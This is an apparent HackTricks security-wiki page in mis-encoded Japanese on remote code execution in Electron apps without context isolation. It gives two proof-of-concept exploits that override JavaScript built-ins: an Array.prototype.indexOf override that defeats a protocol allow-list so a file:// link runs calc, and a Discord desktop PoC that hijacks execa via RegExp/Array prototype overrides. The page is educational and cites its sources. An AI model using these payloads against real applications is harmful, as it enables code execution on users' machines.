# Electron contextIsolation RCE via preload code

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>

## ä¾‹ 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)ã‹ã‚‰ã®ä¾‹

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ–ãƒ©ã‚¦ã‚¶ã§http(s)ãƒªãƒ³ã‚¯ã‚’é–‹ãã¾ã™ï¼š

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

`file:///C:/Windows/systemd32/calc.exe`ã®ã‚ˆã†ãªã‚‚ã®ã‚’ä½¿ç”¨ã—ã¦calcã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€`SAFE_PROTOCOLS.indexOf`ãŒã“ã‚Œã‚’é˜²ã„ã§ã„ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯XSSã‚„ä»»æ„ã®ãƒšãƒ¼ã‚¸ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä»‹ã—ã¦ã“ã®JSã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
å‘¼ã³å‡ºã— `SAFE_PROTOCOLS.indexOf` ã¯å¸¸ã«1337ã‚’è¿”ã™ãŸã‚ã€æ”»æ’ƒè€…ã¯ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦calcã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
ä»¥ä¸‹ã¯ã€è¨±å¯ã‚’æ±‚ã‚ã‚‹ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãªã—ã§ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹ä»–ã®æ–¹æ³•ã«ã¤ã„ã¦ã®ã‚ªãƒªã‚¸ãƒŠãƒ«ã‚¹ãƒ©ã‚¤ãƒ‰ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

ã©ã†ã‚„ã‚‰ã€`file://127.0.0.1/electron/rce.jar` ã®ã‚ˆã†ãªã‚‚ã®ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’ãƒ­ãƒ¼ãƒ‰ã—å®Ÿè¡Œã™ã‚‹åˆ¥ã®æ–¹æ³•ãŒã‚ã‚‹ã‚ˆã†ã§ã™ã€‚

## ä¾‹ 2: Discord ã‚¢ãƒ—ãƒªã® RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1) ã‹ã‚‰ã®ä¾‹

ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹ã¨ã€Discord ãŒ `DiscordNative.nativeModules.requireModule('MODULE-NAME')` ã‚’ä»‹ã—ã¦å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹è¨±å¯ã•ã‚ŒãŸãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã«å…¬é–‹ã™ã‚‹é–¢æ•°ã‚’éœ²å‡ºã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚\
ã“ã“ã§ã¯ã€_child\_process_ ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ã‚ˆã†ãª RCE ã‚’ç›´æ¥ä½¿ç”¨ã§ãã‚‹ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ä½¿ç”¨ã§ãã¾ã›ã‚“ã§ã—ãŸãŒã€**JavaScript ã®çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã—ã€å…¬é–‹ã•ã‚ŒãŸãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®å®Ÿè¡Œã«å¹²æ¸‰ã™ã‚‹ã“ã¨ã§ RCE ã‚’é”æˆã§ãã‚‹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã¾ã—ãŸ**ã€‚

ä»¥ä¸‹ã¯ãã® PoC ã§ã™ã€‚devTools ã‹ã‚‰ "_discord\_utils_" ã¨ã„ã†ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹ `getGPUDriverVersions` é–¢æ•°ã‚’**å‘¼ã³å‡ºã™**ã¨ãã«ã€**`RegExp.prototype.test` ã¨ `Array.prototype.join` ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã™ã‚‹**ã“ã¨ã§ã€**calc** ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒ **ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã™ã‚‹**ã“ã¨ã‚’ç¢ºèªã§ãã¾ã—ãŸã€‚
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
```markdown
`getGPUDriverVersions` é–¢æ•°ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã« "_execa_" ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™:
```
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
é€šå¸¸ã€_execa_ ã¯ `nvidiaSmiPath` å¤‰æ•°ã§æŒ‡å®šã•ã‚ŒãŸ "_nvidia-smi.exe_" ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™ãŒã€`RegExp.prototype.test` ã¨ `Array.prototype.join` ãŒã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã•ã‚ŒãŸãŸã‚ã€**å¼•æ•°ãŒ \_execa\_\_ ã®å†…éƒ¨å‡¦ç†ã§ "**_**calc**_**" ã«ç½®ãæ›ãˆã‚‰ã‚Œã¾ã™**ã€‚

å…·ä½“çš„ã«ã¯ã€ä»¥ä¸‹ã®äºŒã¤ã®éƒ¨åˆ†ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§å¼•æ•°ãŒç½®ãæ›ãˆã‚‰ã‚Œã¾ã™ã€‚

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ã§ AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã® PEASS & HackTricks ã‚°ãƒƒã‚º**](https://peass.creator-spring.com) ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ **ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® github ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’ **å…±æœ‰ã™ã‚‹**ã€‚

</details>
